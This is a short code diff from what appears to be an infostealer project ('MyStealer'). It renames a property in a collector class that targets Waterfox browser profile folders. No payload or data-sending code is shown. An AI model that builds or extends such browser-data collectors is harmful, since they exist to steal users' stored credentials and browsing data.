@@ -5,7 +5,7 @@ namespace MyStealer.Collectors.Browser.FirefoxBased
 {
     internal class WaterFox : Firefox
     {
-        public override string ApplicationName => "Waterfox";
+        public override string ModuleName => "Waterfox";
 
         protected override string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "WaterFox", "Profiles");
 
